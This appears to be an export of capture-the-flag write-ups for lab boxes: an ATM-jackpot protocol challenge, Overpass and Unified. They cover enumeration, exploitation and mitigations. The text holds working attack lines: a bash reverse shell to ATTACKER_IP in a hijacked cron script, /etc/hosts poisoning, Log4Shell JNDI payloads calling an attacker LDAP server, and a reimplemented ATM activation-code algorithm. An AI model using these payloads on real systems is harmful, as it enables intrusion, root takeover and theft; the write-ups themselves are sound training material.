WordPress admin panel reachable with password-only auth: A brute-forceable admin password turned directly into a code-execution primitive via the Theme Editor. WordPress admin logins should sit behind MFA or at minimum an IP allowlist / rate limiting, and the Theme/Plugin Editor should be disabled in wp-config.php (DISALLOW_FILE_EDIT) on any production install.

Plaintext credentials in world-readable locations: Both pivots in this box — aubreanna's SSH password and the root password — were recovered from plaintext notes left in /opt, readable by any local user. Credentials belong in a secrets manager, never in a text file with default permissions.

Jenkins Script Console reachable with a weak password: The Groovy console is, by design, full remote code execution for anyone who can authenticate. It should be disabled outright on anything but a locked-down admin workstation, and if it must stay enabled, Jenkins should enforce strong authentication and should not be reachable even from other containers on the same host without an explicit need.

Docker-internal services treated as implicitly trusted: Jenkins was bound to a container-internal IP with no additional authentication expected because it "wasn't externally reachable." Any host-level compromise — exactly what happened here — erases that boundary instantly. Internal network segmentation should not substitute for authentication on the service itself.

writeups.takeawayHtml: The big lesson here is that "internal-only" is not a security control once the perimeter is breached once. Jenkins trusted its Docker-bridge binding as sufficient isolation, but a single WordPress credential-stuffing success gave www-data, which led to aubreanna, who had SSH access, which is all it took to reach the "internal" Jenkins over a loopback forward. Defense needs to assume lateral movement is possible and authenticate every service on its own merits, not on the assumption that nothing malicious already has a foothold on the host. The secondary pattern worth remembering: WordPress's Theme/Plugin Editor is functionally an authenticated webshell dropper built into core. Any time file-upload restrictions are blocking a shell, check whether an in-app code editor exists that writes to disk without going through that same validation path.
writeups.againHtml:
Skip the CVE proof-of-concept attempt entirely — a 71-vulnerability-count WordPress version with a known admin username is a brute-force target first, not a research target. Go straight to Hydra against wp-login.php.

Once in wp-admin, go straight for the Theme Editor instead of fighting the upload filter with extension tricks. It's faster and it's the intended path for any WordPress box with no active security plugin.

For the Jenkins pivot, the moment docker0 and a 172.17.x.x reference show up anywhere — login banner, .bash_history, a stray text file — immediately grep -ri common internal-service keywords (jenkins, gitlab, tomcat, portainer) across the user's home and /opt//var rather than guessing at ports. That's what actually surfaced the hint here, just later than it needed to.

writeups.title: Jackpot
writeups.summary: The target runs a fake ATM web UI on port 8080 that serves a stripped x86-64 binary called jackpot. The binary takes a 6-digit nonce from the ATM…
writeups.takeaway: The critical insight here is protocol framing: the XFS server sends an unsolicited banner on every new connection, and the reply to your command comes after that. A client that opens a fresh socket per request reads the banner as the reply and silently misses every actual response. This kind of "greeting + command" pattern is common in legacy industrial and banking protocols — Telnet, FTP, SMTP, and others all do it. When every command returns the same result regardless of input, the first thing to check is whether you're reading the right frame. The binary reversal lesson is also worth keeping: stripped + PIE + no canary doesn't mean the algorithm is hidden. objdump and strings together exposed the constant 0xcbf29ce484222325 (FNV-1a offset basis) and the string "ENBANK" in .rodata. Those two facts determined the algorithm family and the second-pass input immediately. You don't always need dynamic analysis to understand what a binary does.
writeups.tldrHtml: The target runs a fake ATM web UI on port 8080 that serves a stripped x86-64 binary called jackpot. The binary takes a 6-digit nonce from the ATM screen and outputs an 8-digit activation code derived from two FNV-1a passes with an xorshift mixed in. Port 9100 exposes an XFS-bridge binary protocol — the ATM's engineering interface — but all commands silently return the banner unless you read the banner first on the same persistent socket. Once the protocol framing is figured out, the attack chain is: get the current nonce from the /status API, run it through the reversed algorithm to compute the activation code, send it to WFS_CMD_CDM_ARM as a raw string payload (not JSON), disable the fraud monitor, loop WFS_CMD_CDM_DISPENSE until the vault is empty, then call WFS_CMD_CDM_GET_FLAG.

sections.label: Introduction
sections.html:
Jackpot simulates an ATM cashout — specifically the kind where an attacker gains access to the engineering interface of a cash dispense machine (CDM) and empties the vault. The room uses the XFS/CEN standard, which is the actual protocol stack that real ATM software sits on; most ATM vendors abstract over XFS, so this isn't entirely fictional.

The interesting layers here are: a custom binary protocol over raw TCP, a stripped binary that implements an HMAC-like activation code scheme you have to reverse, and a pile of red herrings in the web UI and content enumeration that go exactly nowhere. The whole challenge is about reading the protocol spec correctly and figuring out that "keepalive" framing is the difference between the server responding and silently returning the same banner every single time.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.49.184.196 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC

Three open ports:

PortServiceNotes
22/tcpSSHOpenSSH 9.6p1 Ubuntu
8080/tcpHTTPPython BaseHTTPServer 0.6 — "Earth's National Bank — Terminal 004 Engineering Console"
9100/tcpUnknownNo service banner from Nmap; jetdirect? guess

Port 9100 is typically HP JetDirect (printers). It is not a printer.

Web Recon — Port 8080

The title on port 8080: Earth's National Bank — Terminal 004 Engineering Console. The page served a download button. Feroxbuster against raft-medium-directories.txt with common extensions found only /status and variations of it — all returning the same 399-byte response — before being cancelled. The /status endpoint returned live ATM state as JSON:

curl -s http://10.49.178.119:8080/status | jq .
{
  "nonce": "993269",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "cassettes": [
    {"id": "CST1", "denom": 10, "count": 100},
    {"id": "CST2", "denom": 20, "count": 80},
    {"id": "CST3", "denom": 50, "count": 60},
    {"id": "CST4", "denom": 100, "count": 40}
  ],
  "flag_released": false
}

The nonce field rotates. flag_released is the win condition.

sections.label: Foothold
sections.html:
Binary Analysis — jackpot

The download button on the web UI delivered a file called jackpot. Initial checks:

file Downloads/jackpot
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
checksec file Downloads/jackpot
Full RELRO  No Canary  SHSTK & IBT  NX enabled  PIE Enabled  No Symbols  FORTIFY Yes

Stripped, PIE, no symbols. strings revealed the key clues:

ENBANK
[*] session nonce : %s
[*] activation code: %08u
Earth's National Bank - Terminal Engineering Tool
usage: %s <6-digit session code from ATM screen>

The binary takes a 6-digit argument and prints an 8-digit activation code. It doesn't have execute permission by default, so direct execution fails:

./Downloads/jackpot 123456
# zsh: permission denied

/lib64/ld-linux-x86-64.so.2 ./Downloads/jackpot 123456
# [*] session nonce : 123456
# [*] activation code: 47384178

Invoking it via the dynamic linker directly bypasses the missing execute bit.

Reversing the Algorithm

Disassembling .text with objdump -d -M intel:

The main function:

  1. Takes the nonce string as argv[1], validates it's exactly 6 characters
  2. Runs an FNV-1a-like hash loop over the nonce bytes: h ^= byte; h = h * 0x100000001b3
  3. After the first loop, there's a second pass using the string at .rodata offset 0x2004 — which is "ENBANK" — but with an xorshift applied to the hash after the second pass: h = h ^ (h >> 0x1d) before the final % 0x5f5e100 (100,000,000)

Initial offset for h is 0xcbf29ce484222325 — the FNV-1a 64-bit offset basis.

Reimplemented in Python to test against known output:

# hash.py
OFF  = 0xcbf29ce484222325
P    = 0x100000001b3
MASK = 0xFFFFFFFFFFFFFFFF

def plain(data, h=OFF):
    for b in data:
        h ^= b
        h = (h * P) & MASK
    return h

def xorshift_after(data, h=OFF):
    for b in data:
        h ^= b
        h = (h * P) & MASK
    h = (h ^ (h >> 0x1d)) & MASK
    return h

nonce = b"993269"
h1 = plain(nonce, OFF)
h2 = xorshift_after(b"ENBANK", h1)
code = h2 % 100_000_000
print(f"code = {code:08d}")
code = 16845467

Matches the binary output for nonce 993269. The algorithm: FNV-1a over nonce (no xorshift) → FNV-1a over "ENBANK" seeded from pass 1 (xorshift applied after the loop) → modulo 10^8.

sections.label: Shell and access
sections.html:
There is no shell on this box. The attack is entirely protocol-based: reverse the binary, speak the XFS protocol correctly, and drain the ATM.

XFS Protocol — Port 9100

Sending anything to port 9100 returns what looks like a JSON banner:

{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}

Initial XFS client (xfs.py) sent the request on a fresh socket and read back the reply. Every single command — valid, invalid, GETINFO, EXECUTE, empty, {} — returned the identical banner. The server appeared to be ignoring all input.

The fix: the banner is sent unsolicited on connect. The server waits for the client to consume it, then processes the actual request on the same connection. Opening a new socket per command means the client reads the banner as the reply and closes before the actual response is sent. Classic connection teardown race.

Rewrote the client (xfs2.py) to read the banner first on connect, then send the command, then read the actual reply — all on one persistent socket. This made the protocol work.

sections.label: Escalation
sections.html:
With the protocol working, GETINFO 0x0304 returned the full command table:

{
  "commands": {
    "WFS_INF_CDM_STATUS":    "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
    "WFS_INF_CDM_CAPABILITIES":  "0x304",
    "WFS_CMD_CDM_DISPENSE":  "0x401",
    "WFS_CMD_CDM_ARM":       "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
    "WFS_CMD_CDM_GET_FLAG":  "0x4ff"
  },
  "max_dispense": 40
}

The sequence to drain the vault: ARM → disable monitor → DISPENSE loop → GET_FLAG.

sections.label: The full chain
sections.html:
Step 1 — Get current nonce

curl -s http://10.49.178.119:8080/status | jq -r .nonce
993269

Step 2 — Compute activation code

/lib64/ld-linux-x86-64.so.2 ./Downloads/jackpot 993269
[*] session nonce : 993269
[*] activation code: 16845467

Step 3 — ARM the CDM

The WFS_CMD_CDM_ARM command expects the activation code as the raw data payload — not wrapped in JSON:

python3 xfs2.py 0x02 0x4f0 '16845467'
{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}

Sending {"code": "16845467"} with any field name returns WFS_ERR_CDM_INVALIDCODE. The server validates a plain string payload matching the activation code, not a JSON structure.

Step 4 — Disable fraud monitor

python3 xfs2.py 0x02 0x4f1 'off'
{"rc": "WFS_SUCCESS", "monitor_on": false}

Step 5 — Dispense loop

280 notes, 40 per call, 7 calls:

for i in $(seq 1 8); do
  python3 xfs2.py 0x02 0x401 ''
  curl -s http://10.49.178.119:8080/status | jq -c '{dispensed_total,remaining_notes,flag_released}'
  rem=$(curl -s http://10.49.178.119:8080/status | jq -r .remaining_notes)
  [ "$rem" -eq 0 ] && break
done

After 7 calls:

{
  "rc": "WFS_SUCCESS",
  "notes": 40,
  "value": 400,
  "remaining_notes": 0,
  "detail": "vault empty - cashout proven; GET_FLAG now available"
}

Step 6 — Get the flag

python3 xfs2.py 0x02 0x4ff ''
{
  "rc": "WFS_SUCCESS",
  "flag": "THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}"
}

sections.label: Rabbit holes
sections.html:
Feroxbuster on port 8080: Spent time running directory scans against the web UI. Found only /status and duplicate extensions of it. The web surface is exactly one download endpoint and one status API — there is nothing else there.

Initial xfs.py one-shot client: Every command returned the identical banner regardless of content. Spent significant time assuming the issue was the protocol framing (wrong byte order, wrong length field, missing null terminator, wrong command IDs). None of those were the problem. The server sends a banner on connect unconditionally; a client that opens a new socket per request reads the banner as the reply and misses the actual response every single time. The fix was a persistent socket — read banner first, then command.

JSON payload for WFS_CMD_CDM_ARM: After getting the protocol working, all attempts to send the activation code in JSON format ({"code":"16845467"}, {"activationCode":16845467}, {"code":16845467}, tried 7+ field names) returned WFS_ERR_CDM_INVALIDCODE. The server expected the raw numeric string as the entire data payload with no wrapping. This took about 15 minutes of iteration.

GDB dynamic analysis on the binary: Attempted to set a breakpoint at 0x116c (just before the final division) to read the hash from $rax at runtime. Failed twice — first because the binary lacked execute permission (forgot chmod +x before the gdb call), then because PIE relocates the binary at runtime and the static address 0x116c doesn't exist in memory until it's rebased. The correct approach is to break on starti, read the base address, and add the offset — but by this point the Python reimplementation already matched the binary output exactly, so gdb wasn't needed.

Trying to type Python code directly into zsh: Pasted the def fnv1a(...) function block into the terminal interactively. zsh tried to execute each line as a separate command and threw parse errors. Not Python's fault.

sections.label: Mitigations
sections.html:
Activation code algorithm security: The activation code is derived from FNV-1a — a checksum algorithm, not a cryptographic hash. FNV-1a has no key, no secret, and no resistance to reverse engineering. An attacker who obtains the binary can recover the full algorithm in minutes. A proper implementation would use HMAC-SHA256 with a secret key stored in hardware-protected storage (TPM or HSM), making the activation code impossible to replicate without the hardware secret even if the algorithm is known.

Unauthenticated XFS engineering interface on the network: The XFS gateway on port 9100 accepts connections from any host, requires no authentication layer before accepting EXECUTE commands, and trusts the activation code as the sole authorization gate. A real ATM engineering interface should be accessible only over a dedicated management network or through a VPN, and should require mutual TLS client certificates before any command is processed.

Fraud monitor as an optional disable: The fraud monitor (WFS_CMD_CDM_SET_MONITOR) can be disabled by any authenticated supervisor session. If the monitoring system is a security control, it should not be defeatable through the same interface it is meant to protect. Disabling it should require a second authorization factor or should only be possible from a physically separate management console.

Binary distribution via unauthenticated HTTP: The jackpot binary was served over plain HTTP from a port accessible to anyone on the network. An attacker who can download the binary can reverse it. Tools like this should not be distributed from the network-facing service they authenticate to — they belong on physically controlled maintenance laptops or dedicated provisioning systems.

writeups.takeawayHtml: The critical insight here is protocol framing: the XFS server sends an unsolicited banner on every new connection, and the reply to your command comes after that. A client that opens a fresh socket per request reads the banner as the reply and silently misses every actual response. This kind of "greeting + command" pattern is common in legacy industrial and banking protocols — Telnet, FTP, SMTP, and others all do it. When every command returns the same result regardless of input, the first thing to check is whether you're reading the right frame. The binary reversal lesson is also worth keeping: stripped + PIE + no canary doesn't mean the algorithm is hidden. objdump and strings together exposed the constant 0xcbf29ce484222325 (FNV-1a offset basis) and the string "ENBANK" in .rodata. Those two facts determined the algorithm family and the second-pass input immediately. You don't always need dynamic analysis to understand what a binary does.
writeups.againHtml:
Skip feroxbuster entirely. There's nothing on the web surface beyond /status — the page title says "Terminal Engineering Tool" and there's a single download button. The web UI exists to deliver the binary and expose the nonce. Five minutes of reading the page source is worth more than a 90-second directory scan.

For the protocol, the first question when every command returns the same thing should be "is my client reading a stale frame?" before assuming wrong command IDs or wrong byte order. A timeout 5 nc jackpot.thm 9100 | xxd | head to see whether the banner arrives unprompted would have pointed to the persistent-socket fix immediately.

For the binary, chmod +x before attempting any dynamic analysis. Also: PIE means no static breakpoints in gdb — always starti first, read the load base from /proc/<pid>/maps, then add your offset.

writeups.title: Overpass
writeups.summary: Overpass serves a Go-based "password manager" on port 80. gobuster finds /admin, whose login is gated entirely in the browser — login.js stores…
writeups.takeaway: Broken authentication doesn't need to be subtle to be devastating — here it was "the server trusts a cookie it never issued." Read client-side JavaScript before attacking the server; the logic flaw is often sitting there in plaintext. On the privesc side, curl | bash as root is a standing invitation — check crontabs and world-writable /etc files before reaching for linpeas.
writeups.tldrHtml: Overpass serves a Go-based "password manager" on port 80. gobuster finds /admin, whose login is gated entirely in the browser — login.js stores whatever the API returns as a SessionToken cookie, and the admin page only checks that the cookie *exists*. Setting that cookie to anything unlocks a page holding a passphrase-protected RSA key for james. ssh2john + john crack the passphrase (james13), and the key logs in over SSH. On the box, root's crontab runs curl overpass.thm/downloads/src/buildscript.sh | bash every minute, and /etc/hosts is world-writable — point the hostname at your own box, serve a reverse shell as the script, and root connects back in under sixty seconds.

sections.label: Introduction
sections.html:
Overpass is a THM Easy box built around a textbook broken authentication flaw (OWASP A07:2021) and a classic remote-code-execution-by-cron privesc. The foothold needs no exploit code at all — just reading the JavaScript the server already hands you and noticing it never actually checks anything. The escalation is a curl | bash pattern running as root, made trivially hijackable by a world-writable /etc/hosts. Neither step involves a CVE; both are configuration and design failures that show up in real environments constantly.

Prerequisites

Readers should know:

  • How browser DevTools can be used to read client-side JavaScript and set cookies manually
  • Why client-side-only authentication checks are fundamentally broken
  • What ssh2john / John the Ripper are for and how to crack a passphrase-protected SSH key
  • How /etc/hosts resolution works and why a world-writable copy of it is dangerous

sections.label: Recon
sections.html:
(~5 mins)

Port Scan

nmap -sC -sV -oN nmap_initial.txt 10.10.x.x
PortServiceVersion / Detail
22/tcpSSHOpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcpHTTPGolang net/http server — "Overpass"

Two ports. The HTTP server is a Go binary advertising itself as a "military-grade, open-source password manager." No obvious framework CVEs to chase — this is custom code.

Web Enumeration

gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
URLNotes
/adminLogin form
/aboutusStatic page
/downloadsApp's own Go source + binaries
/css, /imgStatic assets

/admin is the obvious target. /downloads looks tempting but turns out to be a distraction (see Rabbit Holes).

sections.label: Foothold
sections.html:
(~10 mins)

Reading login.js

Before touching the form, DevTools → Sources → login.js:

async function login() {
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}

The API returns either the literal string "Incorrect credentials" or a token. The client treats *anything else* as valid and stores it. /admin itself only checks that SessionToken exists — there's no server-side session table being consulted at all. This is an IDOR's cousin: not "guess someone else's ID," but "there was never a lock on the door."

Setting the Cookie

document.cookie = "SessionToken=whatever"

Reload /admin. The panel renders a note to James and, beneath it, his RSA private key:

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
...
-----END RSA PRIVATE KEY-----

Proc-Type: 4,ENCRYPTED — passphrase-protected. The key alone isn't enough.

Cracking the Passphrase

chmod 600 id_rsa
ssh2john id_rsa > james_hash
john --wordlist=/usr/share/wordlists/rockyou.txt james_hash
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
james13          (id_rsa)

Credentials found:

UsernameKey passphraseService
jamesjames13SSH (via private key)

sections.label: Shell and access
sections.html:
(~12 mins)

SSH as james

ssh -i id_rsa james@10.10.x.x
# Enter passphrase for key 'id_rsa': james13
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)

Already a full TTY via SSH — no script/PTY upgrade needed.

User Flag

cat ~/user.txt
thm{65c1aaf000506e56996822c6281e6bf7}

sections.label: Escalation
sections.html:
(~15 mins)

Crontab

cat /etc/crontab
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

Every minute, root fetches a script by hostname and pipes it straight to bash. No pinned IP, no signature check — whatever overpass.thm resolves to, root executes.

Can james control resolution?

ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts

World-writable. james can add an entry for overpass.thm and the root cron will fetch from wherever we point it.

sections.label: The full chain
sections.html:
The complete attack chain:

  1. Broken client-side auth — /admin trusts cookie presence, not validity → leaked RSA key for james
  2. Passphrase crack — ssh2john + john → james13 → SSH access
  3. Crontab enum — root runs curl overpass.thm/... | bash every minute
  4. /etc/hosts hijack — world-writable, redirect overpass.thm to attack box
  5. Payload delivery — serve malicious buildscript.sh → root reverse shell → root flag

Step-by-Step

Build the payload tree matching the cron's requested path:

mkdir -p ~/overpass/downloads/src && cd ~/overpass
cat > downloads/src/buildscript.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
nc -lvnp 4444
sudo python3 -m http.server 80

Poison resolution on the target:

echo "ATTACKER_IP overpass.thm" >> /etc/hosts

Within a minute:

10.10.x.x - - [GET /downloads/src/buildscript.sh HTTP/1.1] 200 -
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.x.x] 49876
root@overpass-prod:/#
cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}

sections.label: Rabbit holes
sections.html:
SQLi Fuzzing on /api/login

First instinct on seeing /api/login was to throw ' OR 1=1-- at it. It's a Go net/http handler with no SQL anywhere near the login decision — a few minutes wasted before doing the obvious thing and reading the client JS. The vuln was sitting in plaintext in the browser the entire time.

The /downloads Source Dive

/downloads serves the full Go source for the "Overpass" app. Spent a while reversing it for hardcoded secrets or a crypto flaw in password storage. There's a vulnerable-looking weak-encryption routine in there, but it's a dead end for *this* path — the crontab is the intended route and far shorter.

SUID Hunting

Ran find / -perm -4000 2>/dev/null out of habit. Nothing unusual — stock sudo, passwd, mount. Cost nothing but attention; the crontab was the real answer and should have been checked first.

Port 80 Permission Error

First attempt at python3 -m http.server 80 without sudo → PermissionError: [Errno 13]. Port 80 is privileged. Thirty-second facepalm, fixed with sudo.

sections.label: Mitigations
sections.html:
VulnerabilitySeverityMitigation
Client-side-only session validation on /adminCriticalValidate session tokens server-side against a real session store on every protected request; never trust cookie presence alone
Passphrase-protected private key exposed via web UIHighNever serve private keys through any web interface; distribute credentials via a secrets manager with audit logging
Weak key passphrase (james13), crackable via rockyou.txtMediumEnforce stronger passphrase policy for SSH keys; consider hardware-backed keys for sensitive accounts
Root cron executing remote script fetched by hostname (`curl \bash`)CriticalNever pipe network content into a privileged shell; pin to a fixed IP over TLS and verify a signature/checksum before execution
World-writable /etc/hosts (0666)Criticalchmod 644 /etc/hosts; audit /etc for unexpected write permissions with find /etc -writable -not -user root

writeups.takeawayHtml: Broken authentication doesn't need to be subtle to be devastating — here it was "the server trusts a cookie it never issued." Read client-side JavaScript before attacking the server; the logic flaw is often sitting there in plaintext. On the privesc side, curl | bash as root is a standing invitation — check crontabs and world-writable /etc files before reaching for linpeas.
writeups.againHtml: Open DevTools on /admin before opening a terminal at all — the whole foothold lives in login.js, and the SQLi detour was pure wasted motion. After landing as james, the first three commands should be cat /etc/crontab, ls -la /etc/hosts, and find /etc -writable -not -user root — not a full enumeration script. The intended path reveals itself in under ten seconds once you look in the right place.

writeups.title: Unified
writeups.summary: UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the username and remember…
writeups.takeaway: Log4Shell is the cleanest example of why logging user-controlled input without sanitization is dangerous: the exploit isn't in the application logic, it's in the logging framework processing the data before the application even sees it. The JNDI lookup fires at the log statement — the rest of the application's input validation, authentication checks, and business logic all happen after the RCE has already occurred. There's no patch to the application that fixes this; it requires upgrading the library. The escalation path reinforces the principle of least privilege for service accounts. The unifi OS user could connect to MongoDB and rewrite admin credentials because MongoDB had no authentication requirement. A properly configured environment would have MongoDB require authentication, the UniFi service account would have only the permissions it needs for application operation, and the SSH root credentials would never be stored in a plaintext-readable field in the application's web UI. Any one of those three controls breaks the escalation chain.
writeups.tldrHtml: UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the username and remember POST parameters without sanitization, so injecting ${jndi:ldap://attacker:1389/o=tomcat} into both fields triggers a JNDI lookup that fetches and executes a malicious payload from a rogue LDAP server. Shell lands as unifi. MongoDB is exposed locally on port 27117 with no authentication — connect, find the administrator's user document, replace the x_shadow field with a freshly-generated SHA-512 hash for a known password, then log into the UniFi web panel as administrator. The Site settings page exposes plaintext SSH root credentials. SSH in as root.

sections.label: Introduction
sections.html:
Unified is a HTB Starting Point box built around one of the most impactful vulnerabilities of the last decade: Log4Shell (CVE-2021-44228). UniFi's Network Application runs on Java and logs user-supplied input through Log4j2 — which means anything the login endpoint logs is potentially a code execution vector. The JNDI lookup string ${jndi:ldap://...} gets interpreted by Log4j before it hits any application logic, which is the kind of design decision that haunts you at 2 AM when the CVE drops.

The escalation from unifi to root doesn't require any CVE — just the observation that the application's MongoDB backend is running locally with no authentication and stores admin credentials as replaceable SHA-512 hashes. Swap the hash, log in through the web UI, navigate to Site settings, and the box hands you the root SSH password in plaintext. It's almost polite.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.129.35.160 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC

Six open ports:

PortServiceNotes
22/tcpSSHOpenSSH 8.2p1 Ubuntu
6789/tcpibm-db2-admin?UniFi inform port (device communication)
8080/tcpHTTPApache Tomcat — redirects to /manage
8443/tcpHTTPSUniFi web interface — commonName=UniFi, Ubiquiti Inc. certificate
8843/tcpHTTPSUniFi guest portal
8880/tcpHTTPUniFi HTTP portal redirect

The TLS certificate on 8443 is immediately revealing: commonName=UniFi, organizationName=Ubiquiti Inc. — this is the Ubiquiti UniFi Network Application. The certificate expired in April 2024, which is decorative at this point.

Browsing to https://10.129.35.160:8443/manage/account/login?redirect=%2Fmanage confirmed the login portal.

Vulnerability Research

UniFi Network Application is a Java-based controller. The login endpoint processes user input through Log4j2 for logging purposes. CVE-2021-44228 (Log4Shell) affects Log4j2 versions 2.0-beta9 through 2.15.0 — any input that ends up in a log message can be processed as a lookup expression, and ${jndi:ldap://attacker/payload} triggers an outbound LDAP connection that fetches and executes attacker-controlled Java code.

UniFi 6.4.54 is within the vulnerable range. The username and remember POST fields in the login request are both logged — confirmed attack surface.

sections.label: Foothold
sections.html:
Setting Up the Exploit Chain

Two components needed: a rogue LDAP server to handle the JNDI callback, and a payload to deliver. The Log4jUnifi tool wraps both into a single Python script with a bundled rogue-jndi Java component.

mkdir -p ~/htb/unifi-log4shell && cd ~/htb/unifi-log4shell
git clone https://github.com/puzzlepeaches/Log4jUnifi
cd Log4jUnifi

The rogue-jndi submodule wasn't initialized:

git submodule update --init --recursive
# Clones https://github.com/veracode-research/rogue-jndi

Build the rogue JNDI server JAR (requires Maven and JDK 11):

sudo pacman -S maven jdk11-openjdk   # was missing on this machine
mvn package -f utils/rogue-jndi/
# BUILD SUCCESS — outputs RogueJndi-1.1.jar

Install Python dependencies:

pip install -r requirements.txt

Why Not JNDI-Exploit-Kit

The first attempt used the generic JNDI-Exploit-Kit. It failed: that tool's gadget chains (Commons Collections, TemplatesImpl) rely on specific library versions in the target classpath, and UniFi's Java 27 runtime with strict module access blocked the IllegalAccessError paths. Log4jUnifi is built specifically for UniFi's runtime environment and uses a payload approach that works regardless.

Injecting the Payload

Started a listener on the attack box:

nc -lvnp 4444

Fired the exploit — the JNDI string goes into both the username and remember fields of the login JSON body:

python exploit.py -u https://10.129.35.160:8443 -i 10.10.14.92 -p 4444
[*] Starting malicious JNDI Server
{"username": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "strict":true}
[*] Firing payload!
[*] Check for a callback!

sections.label: Shell and access
sections.html:
Listening on 0.0.0.0 4444
Connection received on 10.129.35.160 36042

Shell landed. python wasn't on the box (command not found), so PTY upgrade via the script fallback:

/usr/bin/script -qc /bin/bash /dev/null
unifi@unified:/usr/lib/unifi$

Running as the unifi service account, inside the UniFi application directory.

sections.label: Escalation
sections.html:
User Flag

ls /home
# michael
cat /home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127

(First attempt typo: /home/michiael/ — the box does not share your typos' sense of humor.)

MongoDB Discovery

ss and netstat weren't in PATH, but ps aux was:

ps aux | grep mongo
unifi  67  ... bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117
               --bind_ip 127.0.0.1

MongoDB running locally on port 27117, bound to loopback only. No --auth flag in the process arguments — unauthenticated access.

sections.label: The full chain
sections.html:
MongoDB — Credential Manipulation

Connect to the ace database (UniFi's default):

mongo --port 27117 ace

Enumerate admin users:

db.admin.find()

The administrator user document:

{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
  "name" : "administrator",
  "email" : "administrator@unified.htb",
  "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
  ...
}

x_shadow is the SHA-512 hashed password. Since SHA-512 can't be cracked quickly, the play is to replace it with a hash for a known password.

On the attack box, generate a SHA-512 hash:

mkpasswd -m sha-512 Password123
# $6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X...

Back in the MongoDB shell, update the administrator's hash:

db.admin.update(
  {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
  {$set: {"x_shadow": "$6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X.bQC7Rkf3w8OFU.nzfk8wWH8vPzf/uTRuAXBvids2e."}}
)

Web Panel SSH Root Credentials

Logged into https://10.129.35.160:8443/manage as administrator:Password123.

Navigated to Settings → Site. At the bottom of the page, under the SSH authentication section, plaintext credentials:

root : NotACrackablePassword4U2022

UniFi stores SSH root credentials for managed devices in plaintext in the Site configuration. Ironic name choice.

Root Shell

ssh root@10.129.35.160
# password: NotACrackablePassword4U2022
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681

sections.label: Rabbit holes
sections.html:
JNDI-Exploit-Kit: The first tool tried. Cloned the repo, confirmed the JAR was there, ran it against the target — no callback. The tool's gadget chains depend on specific classpath libraries that UniFi's environment didn't have in the right versions, and Java 27's module restrictions blocked the TemplatesImpl payload path. Wasted about 15 minutes before switching to the UniFi-specific tool.

ss and netstat not in PATH: After landing the shell and trying to enumerate listening ports, ss and netstat both returned command not found. These tools exist on the box but aren't in the unifi user's PATH. ps aux | grep mongo is always a reliable fallback for finding running database services when network enumeration tools aren't accessible.

Typo on user flag path: /home/michiael/user.txt vs /home/michael/user.txt. ls /home would have been the better first move. One character off, two extra commands to correct it.

Running MongoDB commands outside the shell: Early in the session, MongoDB JavaScript syntax (db.admin.update(...)) was pasted into the bash shell instead of the MongoDB shell. Bash returned syntax error near unexpected token '{'. The fix was obvious but required recognizing that the MongoDB client session had to be active before running those commands.

sections.label: Mitigations
sections.html:
Log4Shell (CVE-2021-44228) — Upgrade Log4j2: The root cause is Log4j2 versions below 2.16.0 processing JNDI lookup expressions from user-controlled input. The fix is to upgrade to Log4j2 ≥ 2.16.0, which removed message lookup substitution entirely. As a temporary mitigation for older versions, setting log4j2.formatMsgNoLookups=true or removing the JndiLookup class from the classpath disables the vulnerable feature. UniFi Network Application ≥ 6.5.54 addressed this.

